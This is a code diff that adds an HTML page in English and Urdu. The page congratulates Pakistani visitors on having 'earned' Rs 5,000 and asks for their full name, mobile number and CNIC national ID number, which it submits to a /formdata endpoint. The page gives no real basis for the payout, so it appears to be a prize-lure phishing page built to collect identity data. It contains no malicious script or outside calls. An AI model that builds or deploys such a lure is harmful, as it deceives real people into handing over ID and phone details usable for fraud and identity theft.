@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Earning App - Congratulations</title>
+    <link rel="stylesheet" href="style.css" />
+
+  </head>
+  <body>
+    <header class="container hero" role="banner">
+      <div class="hero-top">
+        <img
+          class="flag"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Flag_of_Pakistan.svg/330px-Flag_of_Pakistan.svg.png"
+          alt="Flag of Pakistan"
+          width="40"
+          height="26"
+        />
+        <div class="amount-pill" aria-label="Payout amount">
+          Rs 5,000
+        </div>
+      </div>
+
+      <h1 class="title">
+        Congratulations! You have earned Rupees 5,000
+      </h1>
+      <p class="subtitle urdu" lang="ur" dir="rtl">
+        مبارک ہو! آپ نے 5000 روپے کمائے ہیں
+      </p>
+    </header>
+
+    <main class="container" role="main">
+      <section class="card">
+        <h2 class="section-title">
+          Please fill your details
+        </h2>
+        <p class="section-subtitle urdu" lang="ur" dir="rtl">
+         براہِ کرم اپنی تفصیلات پُر کریں
+        </p>
+
+        <form class="form" action="/formdata" method="post">
+          <div class="field">
+            <label class="label" for="fullName">
+              <span>Full Name</span>
+              <span class="urdu" lang="ur" dir="rtl">پورا نام</span>
+            </label>
+            <input
+              id="fullName"
+              name="fullName"
+              class="input"
+              type="text"
+              inputmode="text"
+              placeholder="e.g., Ali Khan"
+              required
+              autofocus
+              aria-required="true"
+            />
+          </div>
+
+        
+          <div class="field">
+            <label class="label" for="mobile">
+              <span>Personal Mobile Number</span>
+              <span class="urdu" lang="ur" dir="rtl">ذاتی موبائل نمبر</span>
+            </label>
+            <input
+              id="mobile"
+              name="mobile"
+              class="input"
+              type="tel"
+              inputmode="tel"
+              autocomplete="tel"
+              placeholder="03XXXXXXXXX or +923XXXXXXXXX"
+              pattern="^(03\d{9}|\+923\d{9})$"
+              required
+              aria-required="true"
+              aria-describedby="help-mobile"
+            />
+            <p id="help-mobile" class="help urdu" lang="ur" dir="rtl">
+            فارمیٹ: 03XXXXXXXXX یا +923XXXXXXXXX
+            </p>
+          </div>
+
+        
+          <div class="field">
+            <label class="label" for="cnic">
+              <span>CNIC Number</span>
+              <span class="urdu" lang="ur" dir="rtl">شناختی کارڈ نمبر (CNIC)</span>
+            </label>
+            <input
+              id="cnic"
+              name="cnic"
+              class="input"
+              type="text"
+              inputmode="numeric"
+              placeholder="12345-1234567-1"
+              pattern="^\d{5}-\d{7}-\d{1}$"
+              required
+              aria-required="true"
+              aria-describedby="help-cnic"
+            />
+            <p id="help-cnic" class="help urdu" lang="ur" dir="rtl">
+              فارمیٹ: 12345-1234567-1
+            </p>
+          </div>
+
+          <button class="button" type="submit">
+            Submit
+          </button>
+        </form>
+      </section>
+    </main>
+
+    <footer class="container footer" role="contentinfo">
+      <p class="muted">
+        Need help? Contact support.
+      </p>
+    </footer>
+  </body>
+</html>
